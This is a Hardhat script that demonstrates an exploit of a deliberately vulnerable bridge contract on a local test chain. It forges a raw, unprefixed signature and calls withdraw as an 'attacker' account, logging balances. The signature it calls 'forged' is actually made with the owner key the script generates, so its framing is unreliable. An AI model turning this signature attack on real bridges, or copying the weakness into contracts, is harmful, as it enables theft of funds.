import pkg from "hardhat";
const { ethers } = pkg;

async function main() {
  // default Hardhat signer funds an owner Wallet we create so we can sign raw digests
  const signers = await ethers.getSigners();
  const funder = signers[0];         // default provider-funded account
  const attacker = signers[1];       // attacker EOA (Hardhat signer)

  // create a new owner wallet (we control private key locally)
  const ownerWallet = ethers.Wallet.createRandom().connect(ethers.provider);

  // fund ownerWallet so it can deploy contracts
  await funder.sendTransaction({ to: ownerWallet.address, value: ethers.parseEther("1") });

  // Deploy VulnerableBridge with owner = ownerWallet.address (owner holds the "privilege")
  const VB = await ethers.getContractFactory("VulnerableBridge");
  const vulnerable = await VB.connect(ownerWallet).deploy(ownerWallet.address);
  await vulnerable.waitForDeployment();

  console.log("=== EXPLOITING VULNERABLE BRIDGE ===");
  console.log("Owner (privileged) address:", ownerWallet.address);
  console.log("Attacker address:", attacker.address);
  console.log("VulnerableBridge deployed at:", vulnerable.target);

  // Fund the bridge so there is ETH to withdraw
  await funder.sendTransaction({ to: vulnerable.target, value: ethers.parseEther("10") });

  // Amount attacker will attempt to withdraw (use small integer amount)
  const amount = 10n; // raw units for demo (no decimals)

  // Build the raw message hash exactly as the contract expects
  // solidityPacked: ["address","uint256"]
  const messageHash = ethers.keccak256(ethers.solidityPacked(["address", "uint256"], [attacker.address, amount]));

  // Create a raw signature (NO Ethereum prefix) using owner's signing key
  const sigObj = ownerWallet.signingKey.sign(messageHash);
  const rawSignature = ethers.Signature.from(sigObj).serialized;

  console.log("Message hash (raw):", messageHash);
  console.log("Forged RAW signature (no prefix):", rawSignature);

  // Show balances before
  const attackerBalBefore = Number(ethers.formatEther(await ethers.provider.getBalance(attacker.address)));
  const bridgeBalBefore = Number(ethers.formatEther(await ethers.provider.getBalance(vulnerable.target)));
  console.log("Attacker balance before:", attackerBalBefore);
  console.log("Bridge balance before:", bridgeBalBefore);

  // Attacker calls withdraw with forged raw signature (vulnerable contract uses raw recovery)
  try {
    const tx = await vulnerable.connect(attacker).withdraw(amount, rawSignature);
    await tx.wait();
    console.log("✅ Withdraw succeeded! VulnerableBridge is exploitable.");
  } catch (err) {
    console.log("❌ Withdraw failed:", err.message);
  }

  const attackerBalAfter = Number(ethers.formatEther(await ethers.provider.getBalance(attacker.address)));
  const bridgeBalAfter = Number(ethers.formatEther(await ethers.provider.getBalance(vulnerable.target)));
  console.log("Attacker balance after:", attackerBalAfter);
  console.log("Bridge balance after:", bridgeBalAfter);
}

main().catch((err) => { console.error(err); process.exit(1); });
